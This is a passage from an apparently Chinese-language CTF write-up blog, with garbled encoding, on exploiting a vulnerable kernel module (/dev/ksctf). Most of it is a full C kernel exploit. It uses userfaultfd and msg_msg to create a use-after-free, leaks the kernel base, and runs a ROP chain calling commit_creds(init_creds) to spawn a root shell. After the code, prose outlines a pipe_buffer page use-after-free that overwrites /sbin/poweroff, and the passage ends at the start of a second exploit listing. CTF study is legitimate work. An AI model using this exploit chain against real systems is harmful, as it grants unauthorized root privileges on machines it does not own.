&amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts,  <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_buf));</span><br><span class="line">        <span class="type">int</span> ret = writeMsg(msg_qid, msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0x1337</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Write msg.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = heap_addr - <span class="number">0x7bc00</span> + <span class="number">0xc8</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = heap_addr - <span class="number">0x7bb40</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = <span class="number">0x1000</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = heap_addr + <span class="number">0x300</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[<span class="number">1</span>], <span class="string">&quot;stas&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;write pipe.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x1100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    msg_qid = getMsgQueue();</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    ptr = heap_addr;</span><br><span class="line">    hexx(<span class="string">&quot;ptr&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msg_qid, data, <span class="number">0x1000</span>, <span class="number">0x1337</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;read msg.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;leak data + 0x300&quot;</span>, data + <span class="number">0x300</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x3e8</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x101a740</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line">    </span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">49</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    add_rsp += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0x20</span>;</span><br><span class="line">    payload[index++] = add_rsp;</span><br><span class="line">    payload[index++] = <span class="number">0x800000000</span>;</span><br><span class="line">    payload[index++] = ptr + <span class="number">0x400</span> + <span class="number">0x10</span>;</span><br><span class="line">    payload[index++] = magic_gadget;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = pop_rdi;</span><br><span class="line">    payload[index++] = init_creds;</span><br><span class="line">    payload[index++] = commit_creds;</span><br><span class="line">    payload[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = get_root_shell;</span><br><span class="line">    payload[index++] = user_cs;</span><br><span class="line">    payload[index++] = user_rflags;</span><br><span class="line">    payload[index++] = user_sp;</span><br><span class="line">    payload[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    write(fd, payload, <span class="number">0x180</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-1"><a href="#æ±‚è§£æ•ˆæœ-1" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="userfaultfd-pipe-buffer-page-UAF"><a href="#userfaultfd-pipe-buffer-page-UAF" class="headerlink" title="userfaultfd + pipe_buffer  + page UAF"></a>userfaultfd + pipe_buffer  + page UAF</h2><h3 id="æ€è·¯åˆ†æ-3"><a href="#æ€è·¯åˆ†æ-3" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>ç°åœ¨æˆ‘ä»¬æ¥å‡è®¾ä¸€ç§æ¯”è¾ƒæç«¯çš„æƒ…å†µï¼Œæˆ‘ä»¬ <code>/sys/kernel/notes</code> ç»™æ‰“äº†è¡¥ä¸æ— æ³•æ³„éœ²åœ°å€ï¼Œè€Œä¸”é¢˜ç›®ä¸å†ç»™å‡ºå †åœ°å€ï¼Œä»¥åŠå†…æ ¸ç¼–è¯‘æ—¶å¼€å¯äº† <code>CONFIG_CFI_CLANG</code>ï¼ˆå¯ä»¥é˜²æ­¢æ”»å‡»è€…è¿›è¡Œ <code>rop</code> æ”»å‡»ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬çš„ <code>page uaf</code> ç™»åœºäº†ï¼ï¼ï¼</p><p>è¿™ç©æ„æˆ‘æ˜¯ä» a3 å¸ˆå‚…çš„åšå®¢å­¦çš„ï¼Œååˆ†å»ºè®®æ¯ä½å†…æ ¸çˆ±å¥½è€…å»åå¤é˜…è¯»é‚£ç¯‡æ–‡ç« ï¼š<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">ã€CTF.0x08ã€‘D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a>ï¼Œä¸‹é¢ä¼šå€Ÿç”¨ a3 å¸ˆå‚…åšå®¢ä¸­çš„ä¸€äº›å›¾ç‰‡ï¼š-)</p><p>åŒæ ·æ˜¯åˆ©ç”¨ <code>userfaultfd</code> æ¥åˆ¶é€ å‡º <code>uaf</code>ï¼Œç„¶åä¿®æ”¹ <code>pipe buffer</code> çš„ <code>page</code> æŒ‡é’ˆçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å…¶å‡ºç°ä¸¤ä¸ª <code>pipe buffer</code> æŒ‡å‘åŒä¸€ä¸ª <code>page</code> çš„æƒ…å†µã€‚</p><img src="/2024/10/07/kno_puts/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ­¤æ—¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª <code>pipe buffer</code>ï¼Œå°±ä¼šç›´æ¥é‡Šæ”¾æ‰ä¸€æ•´ä¸ªé¡µï¼Œå‡ºç°é¡µçº§ <code>UAF</code> ï¼ï¼ï¼</p><img src="/2024/10/07/kno_puts/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åœ¨ <code>gdb</code> ä¸­æ‰€çœ‹åˆ°çš„æƒ…å†µå¦‚ä¸‹ï¼š</p><img src="/2024/10/07/kno_puts/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åé¢çš„æ“ä½œå°±å’Œé¢˜ç›®çš„æœ¬èº«æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ï¼ˆå’Œç”¨æˆ·æ€çš„ <code>house of some</code> ä¸€æ ·ğŸ˜‡ï¼‰ã€‚æˆ‘æœ¬æ¥çš„æ€è·¯æ˜¯å°†è¢«é‡Šæ”¾çš„é¡µé‡æ–°å–å‡ºæ¥ç”¨äºå­˜å‚¨å¦ä¸€ä¸ª <code>pipe buffer</code> æ•°ç»„ï¼Œç„¶åä¿®æ”¹å…¶ä¸­ä¸€ä¸ª <code>pipe buffer</code> çš„ <code>flag</code> ä¸º <code>0x10</code>ï¼Œå®ç°ä»»æ„æ–‡ä»¶çš„è¶Šæƒå†™å…¥ã€‚å¯æ˜¯å–·äº†åŠå¤©ä¹Ÿæ²¡æˆåŠŸçš„å‘½ä¸­ã€‚ç„¶åçœ‹åˆ°äº† tplus å¸ˆå‚…çš„ wpï¼Œå…¶æ€è·¯æ›´åŠ çš„ç®€å•ï¼Œå³åˆ¶é€ å‡º <code>page uaf</code> åä¸æ–­çš„å–·å°„ <code>target file</code>ï¼ˆåå¤ openï¼‰ï¼Œç„¶åä¿®æ”¹ <code>file â†’ f_mode</code>ï¼Œä¹Ÿèƒ½å®ç°è¶Šæƒå†™ä»»æ„æ–‡ä»¶ã€‚</p><p>æœ‰äº†è¶Šæƒå†™ä»»æ„æ–‡ä»¶åæˆ‘æ˜¯æƒ³ç€å†™ <code>/etc/passwd </code>æ–‡ä»¶ï¼Œå¯æ˜¯è¿™é“é¢˜ç›®æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å†åŠ ä¸Šæˆ‘ä¹Ÿä¸æ˜¯å¾ˆç†Ÿæ‚‰è¿™ä¸ªä¸œè¥¿ï¼Œäºæ˜¯æˆ‘é€‰ç€ä¿®æ”¹ <code>/sbin/poweroff</code>ã€‚åº”ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯è¿æ¥ç€ <code>busybox</code> çš„ã€‚å½“ <code>qemu</code> å…³é—­çš„æ—¶å€™ä¼šä»¥ <code>root</code> æƒé™æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°† <code>poweroff</code> æ–‡ä»¶ä¿®æ”¹ä¸º <code>readflag</code>ï¼Œç„¶åè¾“å…¥ <code>exit</code> å³å¯ç±»ä¼¼äºç”¨æˆ·æ€çš„ <code>orw</code> ä¸€æ ·è·å– <code>flag</code></p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span 